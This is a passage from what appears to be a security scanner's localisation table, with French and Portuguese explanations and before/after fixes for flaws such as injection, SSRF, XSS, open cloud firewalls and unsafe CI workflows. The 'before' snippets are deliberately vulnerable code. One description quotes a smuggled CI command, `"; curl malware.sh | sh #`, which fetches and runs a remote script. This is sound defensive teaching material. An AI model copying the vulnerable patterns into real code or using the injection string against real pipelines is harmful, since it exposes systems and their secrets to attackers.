      'Une instruction FROM utilise explicitement le tag ":latest" au lieu d\'une version précise. "latest" change avec le temps : le même build, refait à un autre moment, peut obtenir une version différente de l\'image de base — un build non reproductible, et une mise à jour non désirée peut arriver sans que personne ait décidé qu\'elle devait avoir lieu.',
    fix: {
      before: `FROM node:latest`,
      after: `FROM node:20.11-slim`,
    },
  },
  "docker-add-remote-url": {
    title: "Le Dockerfile télécharge un fichier distant avec ADD au lieu de COPY",
    description:
      "Une instruction ADD avec une URL http/https télécharge un fichier depuis internet pendant le build, sans aucune vérification d'intégrité et avec un contenu invisible dans le dépôt. Si cette URL est un jour compromise, le build récupère un contenu arbitraire sans que personne ne le remarque en lisant simplement le Dockerfile.",
    fix: {
      before: `ADD https://example.com/install.sh /tmp/install.sh`,
      after: `RUN curl -fsSL https://example.com/install.sh -o /tmp/install.sh \\\n    && echo "<hash attendu>  /tmp/install.sh" | sha256sum -c -`,
    },
  },
  "k8s-privileged-container": {
    title: "Un conteneur du manifeste Kubernetes s'exécute en mode privilégié",
    description:
      '"privileged: true" dans le securityContext d\'un conteneur désactive presque toute l\'isolation habituelle entre le conteneur et l\'hôte : le conteneur peut accéder aux périphériques de l\'hôte, modifier sa configuration réseau, et dans de nombreux cas obtenir de fait un accès root à la machine qui l\'exécute. Presque jamais nécessaire pour une application normale.',
    fix: {
      before: `securityContext:\n  privileged: true`,
      after: `securityContext:\n  privileged: false\n  capabilities:\n    add: ["NET_BIND_SERVICE"]  # seulement les capabilities réellement nécessaires`,
    },
  },
  "k8s-plaintext-secret-env": {
    title: "Un secret est écrit en clair dans une variable d'environnement d'un manifeste Kubernetes",
    description:
      'Une variable d\'environnement avec un nom du type password/secret/token/key a une valeur littérale ("value:") au lieu d\'être lue depuis un Secret ("valueFrom.secretKeyRef"). Le manifeste lui-même — souvent committé dans un dépôt — contient donc le secret en clair, visible même par quelqu\'un qui ne peut que lire la configuration, sans nécessairement exécuter des commandes dans le cluster.',
    fix: {
      before: `env:\n  - name: DB_PASSWORD\n    value: supersecret123`,
      after: `env:\n  - name: DB_PASSWORD\n    valueFrom:\n      secretKeyRef:\n        name: db-credentials\n        key: password`,
    },
  },
  "k8s-run-as-root": {
    title: "Un conteneur du manifeste Kubernetes est configuré pour s'exécuter en tant que root",
    description:
      '"runAsUser: 0" ou "runAsNonRoot: false" dans le securityContext forcent explicitement le conteneur à s\'exécuter en tant que root. Si un attaquant parvient à exécuter du code dans le conteneur (ex. en exploitant une bibliothèque vulnérable), être root dans le conteneur facilite une évasion vers l\'hôte — ou un impact plus large.',
    fix: {
      before: `securityContext:\n  runAsUser: 0`,
      after: `securityContext:\n  runAsNonRoot: true\n  runAsUser: 1000`,
    },
  },
  "k8s-privilege-escalation": {
    title: "Un conteneur du manifeste Kubernetes peut obtenir plus de privilèges qu'il n'en avait au démarrage",
    description:
      '"allowPrivilegeEscalation: true" dans le securityContext permet à un processus dans le conteneur d\'obtenir plus de privilèges que le processus qui l\'a démarré (ex. via un binaire setuid). Combiné à une vulnérabilité dans l\'application, c\'est un pas de plus vers l\'exécution de code avec plus de privilèges que prévu.',
    fix: {
      before: `securityContext:\n  allowPrivilegeEscalation: true`,
      after: `securityContext:\n  allowPrivilegeEscalation: false`,
    },
  },
  "k8s-host-namespace-access": {
    title: "Un pod du manifeste Kubernetes partage le réseau, les processus ou la mémoire partagée de l'hôte",
    description:
      '"hostNetwork", "hostPID" ou "hostIPC" réglés sur true sortent le pod de son isolation normale : hostNetwork expose le pod sur le réseau de l\'hôte (contournant les network policies du cluster), hostPID lui donne une visibilité sur tous les processus de la machine hôte, hostIPC lui donne accès à la mémoire partagée de l\'hôte. Presque jamais nécessaire pour une application normale — généralement réservé aux outils système/monitoring de bas niveau.',
    fix: {
      before: `spec:\n  hostNetwork: true`,
      after: `spec:\n  hostNetwork: false`,
    },
  },
  "k8s-missing-run-as-non-root": {
    title: "Le manifeste Kubernetes n'impose pas explicitement l'exécution avec un utilisateur non-root",
    description:
      'Aucun "runAsNonRoot" nulle part dans le manifeste (ni au niveau du pod ni du conteneur) : sans le définir, un conteneur s\'exécute avec l\'utilisateur défini par son image — souvent root par défaut, si l\'image elle-même n\'a pas changé cela. Le définir explicitement à true empêche le pod de démarrer si l\'image essaie encore de s\'exécuter en tant que root, au lieu de le découvrir seulement après un incident.',
    fix: {
      before: `containers:\n  - name: app\n    image: myapp:1.0`,
      after: `containers:\n  - name: app\n    image: myapp:1.0\n    securityContext:\n      runAsNonRoot: true`,
    },
  },
  "vulnerable-dependency": (original) => ({
    title: original.title.replace("Dipendenza vulnerabile:", "Dépendance vulnérable :"),
    description: original.description,
    fix: {
      before: original.fix.before,
      after: original.fix.after.replace(
        "Nessuna versione corretta nota ancora — valuta un pacchetto alternativo o segui gli aggiornamenti del progetto.",
        "Aucune version corrigée connue pour le moment — envisagez un package alternatif ou suivez les mises à jour du projet."
      ),
    },
  }),
},
  pt: {
  "supabase-service-role-in-client": {
    title: "A chave secreta do Supabase acaba num ficheiro visível pelo navegador",
    description:
      "Uma variável com prefixo público (ex.: NEXT_PUBLIC_, VITE_) ou um ficheiro do lado do cliente faz referência à service role key do Supabase. Esta chave contorna a Row Level Security: se acabar no pacote do navegador, qualquer pessoa pode lê-la e agir como administrador da base de dados.",
    fix: {
      before: `// components/Dashboard.tsx\nconst supabase = createClient(url, process.env.NEXT_PUBLIC_SUPABASE_SERVICE_ROLE_KEY)`,
      after: `// app/api/admin/route.ts (apenas servidor)\nconst supabase = createClient(url, process.env.SUPABASE_SERVICE_ROLE_KEY)`,
    },
  },
  "hardcoded-secret": {
    title: "Há palavras-passe ou chaves secretas escritas diretamente no código",
    description:
      "Uma chave API, um token ou uma palavra-passe parecem estar escritos como valor literal em vez de lidos a partir de uma variável de ambiente. Qualquer pessoa que leia o código-fonte (ou o repositório, se for público) obtém esse segredo.",
    fix: {
      before: `const apiKey = "sk_live_51H8x9K2eZvKYlo2C..."`,
      after: `const apiKey = process.env.STRIPE_SECRET_KEY`,
    },
  },
  "env-file-with-real-values": {
    title: "Um ficheiro com as palavras-passe reais do projeto está entre os analisados",
    description:
      "Um ficheiro .env com valores reais (não um .env.example) está incluído na análise. Se este ficheiro acabar num repositório ou num deploy público, todas as credenciais que contém ficam expostas.",
    fix: {
      before: `# .env (submetido por engano)\nDATABASE_URL=postgres://user:realpassword@db.host/prod`,
      after: `# .env.example (submetido)\nDATABASE_URL=postgres://user:password@localhost/dev\n\n# o .env fica fora do repositório (.gitignore)`,
    },
  },
  "missing-row-level-security": {
    title: "Qualquer pessoa pode ler ou modificar os dados de todos os utilizadores",
    description:
      "A Row Level Security está desativada, ou uma política permite o acesso a qualquer pessoa (USING (true)) sem verificar quem está a fazer o pedido. Qualquer utilizador autenticado — ou mesmo anónimo — pode ler ou modificar os dados de todos os outros.",
    fix: {
      before: `ALTER TABLE public.orders DISABLE ROW LEVEL SECURITY;`,
      after: `ALTER TABLE public.orders ENABLE ROW LEVEL SECURITY;\nCREATE POLICY "owners only" ON public.orders\n  USING (auth.uid() = user_id);`,
    },
  },
  "sql-injection": {
    title: "Um valor introduzido pelo utilizador é colado diretamente numa query à base de dados",
    description:
      "Uma query SQL é construída concatenando ou interpolando diretamente uma string em vez de usar parâmetros. Se esse texto vier (mesmo que indiretamente) de um utilizador, pode alterar a própria query — SQL injection.",
    fix: {
      before: "db.query(`SELECT * FROM users WHERE email = '${email}'`)",
      after: `db.query("SELECT * FROM users WHERE email = $1", [email])`,
    },
  },
  "plaintext-password-storage": {
    title: "As palavras-passe parecem não estar protegidas",
    description:
      "Um campo de palavra-passe é guardado exatamente como chegou no pedido, e não aparece nenhuma função de hashing (bcrypt, argon2, scrypt) no ficheiro. Se a base de dados for comprometida, todas as palavras-passe ficam imediatamente utilizáveis.",
    fix: {
      before: `await db.users.insert({ email, password: req.body.password })`,
      after: `const hashed = await bcrypt.hash(req.body.password, 12)\nawait db.users.insert({ email, password: hashed })`,
    },
  },
  "hardcoded-jwt-secret": {
    title: "O segredo usado para assinar os acessos está escrito em texto simples no código",
    description:
      "O segredo passado a jwt.sign / jwt.verify (ou a variável JWT_SECRET) é um valor literal no código em vez de vir de uma variável de ambiente. Qualquer pessoa que o leia pode criar tokens de acesso válidos para qualquer utilizador.",
    fix: {
      before: `jwt.sign(payload, "super-secret-key-123")`,
      after: `jwt.sign(payload, process.env.JWT_SECRET)`,
    },
  },
  "command-injection": {
    title: "O servidor pode ser forçado a executar comandos externos",
    description:
      "Uma função que executa comandos de sistema (exec, execSync, spawn) recebe uma string construída por interpolação ou concatenação. Se parte dessa string vier de input do utilizador, quem a controla pode fazer executar comandos arbitrários no servidor.",
    fix: {
      before: "execSync(`convert ${filename} output.png`)",
      after: `execFile("convert", [filename, "output.png"])`,
    },
  },
  "unprotected-new-table": {
    title: "Parece que uma nova tabela foi criada sem proteção",
    description:
      "Uma migração SQL cria uma tabela mas não ativa a Row Level Security para essa mesma tabela no mesmo ficheiro. Enquanto assim permanecer, a tabela nasce sem nenhuma restrição sobre quem a pode ler ou escrever.",
    fix: {
      before: `CREATE TABLE public.invoices (\n  id uuid PRIMARY KEY,\n  user_id uuid REFERENCES auth.users\n);`,
      after: `CREATE TABLE public.invoices (\n  id uuid PRIMARY KEY,\n  user_id uuid REFERENCES auth.users\n);\nALTER TABLE public.invoices ENABLE ROW LEVEL SECURITY;`,
    },
  },
  "permissive-cors": {
    title: "O site aceita pedidos de qualquer outro site",
    description:
      "O cabeçalho CORS está configurado para aceitar pedidos de qualquer origem (*), ou o middleware cors() é usado sem restrições. Qualquer site de terceiros pode chamar as suas APIs a partir do navegador de um utilizador já autenticado.",
    fix: {
      before: `app.use(cors())`,
      after: `app.use(cors({ origin: ["https://oseusite.com"] }))`,
    },
  },
  "admin-function-missing-auth": {
    title: "Uma função com permissões de administrador não verifica quem a usa",
    description:
      "Uma rota ou função cujo nome sugere operações de administrador não contém, nas linhas próximas, nenhuma verificação de autenticação ou de função (role). Qualquer pessoa que conheça o URL poderia executá-la.",
    fix: {
      before: `router.post("/admin/delete-user", async (req, res) => {\n  await db.users.delete(req.body.id)\n})`,
      after: `router.post("/admin/delete-user", requireAuth, requireRole("admin"), async (req, res) => {\n  await db.users.delete(req.body.id)\n})`,
    },
  },
  ssrf: {
    title: "O site pode ser forçado a executar código externo",
    description:
      "Um pedido HTTP de saída (fetch, axios) usa diretamente um valor vindo do pedido de um utilizador como URL de destino. Um utilizador mal-intencionado pode fazer o seu servidor chamar endereços internos ou arbitrários — Server-Side Request Forgery.",
    fix: {
      before: `const data = await fetch(req.query.url)`,
      after: `const ALLOWED = new Set(["https://api.oseuservico.com"])\nif (!ALLOWED.has(req.query.url)) throw new Error("URL não permitido")\nconst data = await fetch(req.query.url)`,
    },
  },
  "weak-password-hashing": {
    title: "As palavras-passe são protegidas com um método agora fácil de quebrar",
    description:
      "Na mesma linha, md5() ou sha1() são aplicados a um valor ligado a uma palavra-passe. Estes algoritmos são rápidos demais de calcular: um atacante com a base de dados pode testar milhares de milhões de palavras-passe por segundo.",
    fix: {
      before: `const hashed = crypto.createHash("md5").update(password).digest("hex")`,
      after: `const hashed = await bcrypt.hash(password, 12)`,
    },
  },
  "xss-dangerous-html": {
    title: "Texto escrito pelos utilizadores poderia executar código no navegador",
    description:
      "Conteúdo é inserido na página como HTML em bruto (dangerouslySetInnerHTML, v-html, .innerHTML) em vez de como texto simples. Se esse conteúdo incluir input de um utilizador, pode conter scripts que são executados no navegador de quem lê a página.",
    fix: {
      before: `<div dangerouslySetInnerHTML={{ __html: comment.text }} />`,
      after: `<div>{comment.text}</div>\n// ou, se for mesmo necessário HTML: DOMPurify.sanitize(comment.text)`,
    },
  },
  "public-storage-bucket": {
    title: "O espaço de ficheiros carregados é visível a qualquer pessoa",
    description:
      "Um bucket de armazenamento (Supabase Storage, S3) está configurado como público. Se contiver documentos, fotos ou ficheiros carregados pelos utilizadores, qualquer pessoa que conheça — ou adivinhe — o caminho pode aceder-lhes sem autenticação.",
    fix: {
      before: `supabase.storage.createBucket("uploads", { public: true })`,
      after: `supabase.storage.createBucket("uploads", { public: false })\n// sirva os ficheiros com URLs assinados e temporários: createSignedUrl(path, 60)`,
    },
  },
  "csrf-state-changing-get": {
    title: "Basta um link para apagar ou alterar dados",
    description:
      "Uma rota GET executa uma operação que altera dados (o caminho contém delete/remove/update/edit). Os pedidos GET são executados só por visitar um link ou carregar uma imagem de um site externo — o ponto de apoio clássico para um ataque CSRF.",
    fix: {
      before: `router.get("/posts/:id/delete", deletePost)`,
      after: `router.post("/posts/:id/delete", requireAuth, csrfProtection, deletePost)`,
    },
  },
  "insecure-token-storage": {
    title: "Os dados de acesso guardados no navegador não estão bem protegidos",
    description:
      "Um token de acesso é guardado em localStorage. Ao contrário de um cookie httpOnly, qualquer script executado na página (incluindo um malicioso injetado via XSS) pode lê-lo e roubá-lo.",
    fix: {
      before: `localStorage.setItem("authToken", token)`,
      after: `// definir o token como cookie httpOnly a partir do servidor:\nres.cookie("authToken", token, { httpOnly: true, secure: true, sameSite: "strict" })`,
    },
  },
  "open-redirect": {
    title: "O site pode ser usado para redirecionar para um site fraudulento",
    description:
      "O site redireciona o utilizador para um endereço obtido diretamente do pedido (query, body, params) sem verificar que é um domínio conhecido. Um link que parece apontar para o seu site pode na realidade levar a uma página de phishing.",
    fix: {
      before: `res.redirect(req.query.next)`,
      after: `const ALLOWED = new Set(["/dashboard", "/profile"])\nres.redirect(ALLOWED.has(req.query.next) ? req.query.next : "/dashboard")`,
    },
  },
  idor: {
    title: "Mudar um número no endereço poderia mostrar dados de outra pessoa",
    description:
      "Uma query à base de dados usa diretamente um identificador obtido do URL (req.params.id) sem verificar, nas linhas próximas, que pertence ao utilizador que está a fazer o pedido. Mudar o id no endereço poderia dar acesso aos dados de outro utilizador — Insecure Direct Object Reference.",
    fix: {
      before: `const order = await Order.findById(req.params.id)`,
      after: `const order = await Order.findOne({ _id: req.params.id, userId: req.user.id })`,
    },
  },
  "no-login-rate-limit": {
    title: "O formulário de acesso não bloqueia demasiadas tentativas seguidas",
    description:
      "Uma rota de login está definida no ficheiro, mas não há nenhum rasto de middleware de rate limiting no mesmo ficheiro. Sem um limite de tentativas, um atacante pode tentar palavras-passe em sequência (força bruta) sem ser travado.",
    fix: {
      before: `router.post("/login", loginHandler)`,
      after: `import rateLimit from "express-rate-limit"\nconst loginLimiter = rateLimit({ windowMs: 15 * 60 * 1000, max: 5 })\nrouter.post("/login", loginLimiter, loginHandler)`,
    },
  },
  "sensitive-data-in-logs": {
    title: "Palavras-passe ou dados sensíveis acabam nos logs",
    description:
      "Uma chamada a console.log (ou semelhante) inclui uma variável chamada password, token, secret ou apiKey. Se estes logs acabarem num serviço externo ou num ficheiro, os dados sensíveis ficam expostos muito mais tempo do que o necessário.",
    fix: {
      before: `console.log("login attempt", { email, password })`,
      after: `console.log("login attempt", { email })`,
    },
  },
  "path-traversal": {
    title: "Um ficheiro no servidor pode ser lido ou escrito escolhendo o caminho a partir de fora",
    description:
      "Uma função que lê, escreve ou envia um ficheiro recebe o caminho diretamente de um valor do pedido (query, body, params) sem verificar que fica dentro de uma pasta permitida. Um atacante pode inserir \"../\" para sair da pasta prevista e ler ou substituir ficheiros arbitrários no servidor (ex.: um ficheiro de configuração com credenciais).",
    fix: {
      before: `app.get("/download", (req, res) => {\n  res.sendFile(req.query.file)\n})`,
      after: `const ALLOWED_DIR = path.resolve("./uploads")\napp.get("/download", (req, res) => {\n  const target = path.resolve(ALLOWED_DIR, req.query.file)\n  if (!target.startsWith(ALLOWED_DIR)) return res.status(400).send("Caminho não permitido")\n  res.sendFile(target)\n})`,
    },
  },
  "nosql-injection": {
    title: "Um valor introduzido pelo utilizador é executado como código dentro de uma query MongoDB",
    description:
      "O operador $where do MongoDB executa JavaScript do lado do servidor para cada documento — se essa string for construída concatenando um valor vindo do utilizador, quem a controla pode fazer executar código arbitrário no contexto da base de dados, não apenas alterar o filtro como numa SQL injection normal.",
    fix: {
      before: `db.collection.find({ $where: "this.username == '" + username + "'" })`,
      after: `db.collection.find({ username: username })`,
    },
  },
  ssti: {
    title: "Um valor introduzido pelo utilizador é interpretado como um template, não como dado",
    description:
      "Uma função que compila/executa um template recebe o template INTEIRO a partir de um valor do pedido, em vez de usar um template fixo e passar apenas os dados. Um atacante pode escrever diretamente na sintaxe do motor de templates (ex.: {{7*7}} para Jinja2) e executar código no servidor — Server-Side Template Injection, que muitas vezes leva à execução de comandos arbitrários, não apenas a um problema de visualização como o XSS.",
    fix: {
      before: `return render_template_string(request.args.get("name"))`,
      after: `return render_template("profile.html", name=request.args.get("name"))`,
    },
  },
  xxe: {
    title: "O parser XML pode ser forçado a ler ficheiros ou fazer pedidos externos",
    description:
      "Um parser XML (DocumentBuilderFactory) é criado sem desativar explicitamente as entidades externas (DOCTYPE), nas linhas próximas. Se o parser receber XML de uma fonte não fiável, um atacante pode definir uma entidade externa para ler ficheiros no servidor ou fazê-lo contactar um endereço à sua escolha — XML External Entity.",
    fix: {
      before: `DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\nDocumentBuilder builder = factory.newDocumentBuilder();`,
      after: `DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\nfactory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);\nDocumentBuilder builder = factory.newDocumentBuilder();`,
    },
  },
  "terraform-open-security-group": {
    title: "Um security group do Terraform abre uma porta sensível a toda a internet",
    description:
      "Uma regra com \"cidr_blocks\" que inclui 0.0.0.0/0 (qualquer endereço IP) está perto de uma porta sensível — SSH (22), RDP (3389), ou uma porta típica de base de dados (MySQL, Postgres, MongoDB, Redis, SQL Server). Qualquer pessoa na internet pode tentar ligar-se a esse serviço, não apenas quem deveria.",
    fix: {
      before: `ingress {\n  from_port   = 22\n  to_port     = 22\n  protocol    = "tcp"\n  cidr_blocks = ["0.0.0.0/0"]\n}`,
      after: `ingress {\n  from_port   = 22\n  to_port     = 22\n  protocol    = "tcp"\n  cidr_blocks = ["10.0.0.0/16"]  # apenas a sua rede privada, ou um bastion host\n}`,
    },
  },
  "gcp-firewall-open-to-internet": {
    title: "Uma regra de firewall do Google Cloud abre uma porta sensível a toda a internet",
    description:
      "Um recurso \"google_compute_firewall\" com \"source_ranges\" que inclui 0.0.0.0/0 (qualquer endereço IP) permite tráfego para uma porta sensível — SSH (22), RDP (3389), ou uma porta típica de base de dados (MySQL, Postgres, MongoDB, Redis, SQL Server). Qualquer pessoa na internet pode tentar ligar-se a esse serviço, não apenas quem deveria.",
    fix: {
      before: `resource "google_compute_firewall" "allow-ssh" {\n  allow {\n    protocol = "tcp"\n    ports    = ["22"]\n  }\n  source_ranges = ["0.0.0.0/0"]\n}`,
      after: `resource "google_compute_firewall" "allow-ssh" {\n  allow {\n    protocol = "tcp"\n    ports    = ["22"]\n  }\n  source_ranges = ["10.0.0.0/16"]  # apenas a sua rede privada, ou um bastion host\n}`,
    },
  },
  "azure-nsg-open-to-internet": {
    title: "Uma regra de rede do Azure abre uma porta sensível a toda a internet",
    description:
      "Uma regra de segurança de rede (\"azurerm_network_security_rule\", ou um bloco \"security_rule\" dentro de \"azurerm_network_security_group\") com \"source_address_prefix\" definido como \"*\" ou \"0.0.0.0/0\", direção \"Inbound\" e acesso \"Allow\", perto de uma porta sensível — SSH (22), RDP (3389), ou uma porta típica de base de dados. Qualquer pessoa na internet pode tentar ligar-se a esse serviço, não apenas quem deveria.",
    fix: {
      before: `resource "azurerm_network_security_rule" "allow-ssh" {\n  direction              = "Inbound"\n  access                 = "Allow"\n  destination_port_range = "22"\n  source_address_prefix  = "*"\n}`,
      after: `resource "azurerm_network_security_rule" "allow-ssh" {\n  direction              = "Inbound"\n  access                 = "Allow"\n  destination_port_range = "22"\n  source_address_prefix  = "10.0.0.0/16"  # apenas a sua rede privada, ou um bastion host\n}`,
    },
  },
  "terraform-hardcoded-secret": {
    title: "Um segredo está escrito como valor por omissão de uma variável Terraform",
    description:
      "Uma variável com um nome tipo password/secret/token/key tem um valor literal no seu \"default\". Ao contrário de um valor passado em tempo de execução (tfvars, variáveis de ambiente TF_VAR_*), um default acaba no código-fonte — e se o repositório for partilhado ou público, qualquer pessoa o vê, mesmo sem acesso ao estado do Terraform.",
    fix: {
      before: `variable "db_password" {\n  default = "supersecret123"\n}`,
      after: `variable "db_password" {\n  # sem valor por omissão: deve ser passado com um ficheiro .tfvars (fora do git) ou uma variável de ambiente TF_VAR_db_password\n  sensitive = true\n}`,
    },
  },
  "gha-script-injection": {
    title: "Um valor controlado por um utilizador externo entra diretamente num comando shell da CI",
    description:
      'Um comando "run:" de um workflow do GitHub Actions interpola diretamente um valor como o título de uma pull request, o nome de um branch ou o texto de um comentário — todos editáveis por qualquer pessoa que abra uma pull request ou comentário, mesmo a partir de um fork externo. Um valor como `"; curl malware.sh | sh #` executaria comandos arbitrários na CI, com acesso a todos os segredos disponíveis nesse workflow.',
    fix: {
      before: `- run: echo "\${{ github.event.pull_request.title }}"`,
      after: `- env:\n    PR_TITLE: \${{ github.event.pull_request.title }}\n  run: echo "$PR_TITLE"  # passado como variável de ambiente, nunca interpolado diretamente no comando`,
    },
  },
  "gha-pull-request-target-checkout": {
    title: "O workflow executa o código de uma pull request externa com acesso aos segredos do repositório",
    description:
      'O workflow usa "pull_request_target" — que corre com as permissões e os segredos do repositório base mesmo para uma pull request aberta a partir de um fork externo — e faz checkout do código da própria pull request ("github.event.pull_request.head"), não do branch base. Quem abre a pull request obtém, na prática, a execução do seu próprio código com acesso a esses segredos.',
    fix: {
      before: `on:\n  pull_request_target:\njobs:\n  build:\n    steps:\n      - uses: actions/checkout@v4\n        with:\n          ref: \${{ github.event.pull_request.head.sha }}`,
      after: `on:\n  pull_request_target:\njobs:\n  build:\n    steps:\n      # Faz checkout do branch base, não do código da PR — ou use\n      # "pull_request" em vez de "pull_request_target" se não precisar\n      # das permissões/segredos mais amplos.\n      - uses: actions/checkout@v4`,
    },
  },
  "insecure-deserialization": {
    title: "Os dados do pedido são desserializados com um formato que pode executar código",
    description:
      "pickle (Python), unserialize() (PHP), ObjectInputStream (Java) ou a biblioteca node-serialize (Node) estão a desserializar um valor obtido diretamente do pedido. Ao contrário do JSON, estes formatos podem representar e executar código durante a própria desserialização — quem controla o valor enviado pode conseguir execução de código arbitrário no servidor.",
    fix: {
      before: `data = pickle.loads(request.data)`,
      after: `import json\ndata = json.loads(request.data)  # o JSON nunca executa código ao fazer parsing, ao contrário do pickle`,
    },
  },
  "jwt-none-algorithm": {
    title: 'O código aceita explicitamente tokens JWT não assinados (algoritmo "none")',
    description:
      '"none" aparece entre os algoritmos aceites para verificar um token JWT. Um token com o algoritmo "none" não tem nenhuma assinatura para verificar: qualquer pessoa pode construir um com qualquer conteúdo (ex.: uma função de administrador) e o código aceitá-lo-ia como válido.',
    fix: {
      before: `jwt.verify(token, secret, { algorithms: ["HS256", "none"] })`,
      after: `jwt.verify(token, secret, { algorithms: ["HS256"] })  // nunca incluir "none" entre os algoritmos aceites`,
    },
  },
  "terraform-s3-block-public-access-disabled": {
    title: "O Block Public Access está desativado num bucket S3 definido em Terraform",
    description:
      'Uma ou mais das quatro proteções de "aws_s3_bucket_public_access_block" (block_public_acls, ignore_public_acls, block_public_policy, restrict_public_buckets) estão definidas como false. Não significa que o bucket já seja público, mas remove uma rede de segurança que impediria que se tornasse público por engano no futuro.',
    fix: {
      before: `resource "aws_s3_bucket_public_access_block" "example" {\n  block_public_acls = false\n}`,
      after: `resource "aws_s3_bucket_public_access_block" "example" {\n  block_public_acls       = true\n  ignore_public_acls      = true\n  block_public_policy     = true\n  restrict_public_buckets = true\n}`,
    },
  },
  "terraform-iam-wildcard-policy": {
    title: "Uma política IAM definida em Terraform concede acesso total",
    description:
      'Uma statement com ação "*" e recurso "*" concede acesso total a todos os serviços e recursos da AWS — a mesma verificação já feita sobre o estado IAM ao vivo, aqui lida diretamente do código antes mesmo de ser aplicada. Pode ser intencional para uma função de emergência, mas deve ser confirmado: para o uso diário, conceda apenas as permissões realmente necessárias.',
    fix: {
      before: `statement {\n  effect    = "Allow"\n  actions   = ["*"]\n  resources = ["*"]\n}`,
      after: `statement {\n  effect    = "Allow"\n  actions   = ["s3:GetObject"]\n  resources = ["arn:aws:s3:::o-seu-bucket/*"]\n}`,
    },
  },
  "gcp-storage-bucket-public": {
    title: "Um bucket do Google Cloud Storage é tornado legível por qualquer pessoa",
    description:
      'Um recurso "google_storage_bucket_iam_member" ou "google_storage_bucket_iam_binding" concede uma função a "allUsers" ou "allAuthenticatedUsers" — o primeiro torna o bucket legível por qualquer pessoa na internet, mesmo sem conta Google; o segundo por qualquer pessoa com uma conta Google qualquer, não apenas quem deveria ter acesso.',
    fix: {
      before: `resource "google_storage_bucket_iam_member" "public" {\n  bucket = google_storage_bucket.example.name\n  role   = "roles/storage.objectViewer"\n  member = "allUsers"\n}`,
      after: `resource "google_storage_bucket_iam_member" "example" {\n  bucket = google_storage_bucket.example.name\n  role   = "roles/storage.objectViewer"\n  member = "user:alguem@example.com"  # apenas quem deve mesmo ter acesso, não allUsers/allAuthenticatedUsers\n}`,
    },
  },
  "azure-storage-public-access": {
    title: "O acesso público aos blobs está ativado numa conta de armazenamento do Azure",
    description:
      '"allow_blob_public_access" está definido como true num "azurerm_storage_account": qualquer pessoa que conheça o URL de um blob/container tornado público pode lê-lo, sem nenhuma autenticação.',
    fix: {
      before: `resource "azurerm_storage_account" "example" {\n  allow_blob_public_access = true\n}`,
      after: `resource "azurerm_storage_account" "example" {\n  allow_blob_public_access = false\n}`,
    },
  },
  "gcp-iam-overly-broad-role": {
    title: "Uma função IAM do Google Cloud concede acesso total (Owner/Editor)",
    description:
      'Um "google_project_iam_binding"/"google_project_iam_member" (ou o equivalente ao nível de organização/pasta) atribui a função primitiva "roles/owner" ou "roles/editor" — acesso quase total a todos os serviços do projeto. Pode ser intencional para uma conta de emergência, mas deve ser confirmado: para o uso diário, conceda apenas as funções predefinidas mais específicas que são realmente necessárias.',
    fix: {
      before: `resource "google_project_iam_member" "admin" {\n  project = "my-project"\n  role    = "roles/owner"\n  member  = "user:dev@example.com"\n}`,
      after: `resource "google_project_iam_member" "admin" {\n  project = "my-project"\n  role    = "roles/storage.admin"  # apenas a função predefinida realmente necessária, não roles/owner\n  member  = "user:dev@example.com"\n}`,
    },
  },
  "azure-role-assignment-owner": {
    title: "Uma atribuição de função do Azure concede acesso total (Owner)",
    description:
      'Uma "azurerm_role_assignment" atribui a função "Owner" — acesso total, incluindo controlo sobre as permissões de outros utilizadores, em todo o âmbito atribuído (subscrição, grupo de recursos...). Pode ser intencional para uma conta de emergência, mas deve ser confirmado: para o uso diário, conceda apenas a função mais específica realmente necessária (ex.: "Contributor" num único grupo de recursos).',
    fix: {
      before: `resource "azurerm_role_assignment" "example" {\n  scope                = data.azurerm_subscription.primary.id\n  role_definition_name = "Owner"\n}`,
      after: `resource "azurerm_role_assignment" "example" {\n  scope                = azurerm_resource_group.example.id\n  role_definition_name = "Contributor"  # apenas a função mais específica realmente necessária, não Owner em toda a subscrição\n}`,
    },
  },
  "weak-random-token": {
    title: "Um token de segurança é gerado com um gerador de números aleatórios não seguro",
    description:
      "Um valor com um nome tipo token/session/reset/otp/csrf é gerado com Math.random() (JS), random.random() (Python) ou rand() (PHP) — geradores não pensados para segurança, cujas sequências são previsíveis. Um token gerado assim pode ser adivinhado ou reconstruído, anulando o propósito para o qual existe (ex.: um link de reposição de palavra-passe que qualquer pessoa poderia prever).",
    fix: {
      before: `const resetToken = Math.random().toString(36).slice(2);`,
      after: `const resetToken = crypto.randomBytes(32).toString("hex"); // crypto, não Math.random — imprevisível`,
    },
  },
  "ldap-injection": {
    title: "Um filtro LDAP é construído concatenando diretamente um valor do pedido",
    description:
      'Uma linha que constrói um filtro LDAP (ex.: "(uid=...)") inclui diretamente um valor obtido do pedido, sem nenhum escape dos caracteres especiais do LDAP. Quem controla esse valor pode alterar a lógica do filtro — por exemplo, contornar uma verificação de autenticação ou ler dados do diretório que não deveria ver.',
    fix: {
      before: `const filter = \`(uid=\${req.body.username})\`;\nclient.search(base, { filter });`,
      after: `const filter = \`(uid=\${ldapEscape(req.body.username)})\`; // os caracteres especiais do LDAP devem ser sempre escapados antes de os usar num filtro\nclient.search(base, { filter });`,
    },
  },
  "header-injection": {
    title: "Um valor do pedido acaba diretamente num cabeçalho HTTP de resposta",
    description:
      "Um cabeçalho HTTP de resposta é definido com um valor obtido diretamente do pedido (query, body, params), sem verificar que não contém quebra de linha (CRLF). Um atacante pode inserir cabeçalhos adicionais ou até uma resposta inteiramente diferente — response splitting — podendo manipular cache, cookies ou o conteúdo mostrado a outros utilizadores.",
    fix: {
      before: `res.setHeader("X-Redirect-Reason", req.query.reason)`,
      after: `const ALLOWED_REASONS = new Set(["expired", "manual"])\nres.setHeader("X-Redirect-Reason", ALLOWED_REASONS.has(req.query.reason) ? req.query.reason : "unknown")`,
    },
  },
  "gha-unpinned-action": {
    title: "Uma ação de terceiros na CI não está fixada numa versão precisa (commit SHA)",
    description:
      'O workflow usa uma ação de terceiros referenciada por tag ou branch (ex.: "@v1", "@main") em vez de por commit SHA. Quem a mantém — ou quem comprometer a sua conta — pode mover essa referência para um commit diferente a qualquer momento, mudando silenciosamente o que corre na CI, com acesso aos seus segredos. Um commit SHA aponta sempre para exatamente o mesmo código.',
    fix: {
      before: `uses: some-org/some-action@v1`,
      after: `uses: some-org/some-action@a1b2c3d4e5f6...  # v1, fixada no commit SHA — atualize o SHA quando atualizar a versão`,
    },
  },
  "gha-excessive-permissions": {
    title: "O workflow concede a si próprio todas as permissões do token em vez de apenas as que usa",
    description:
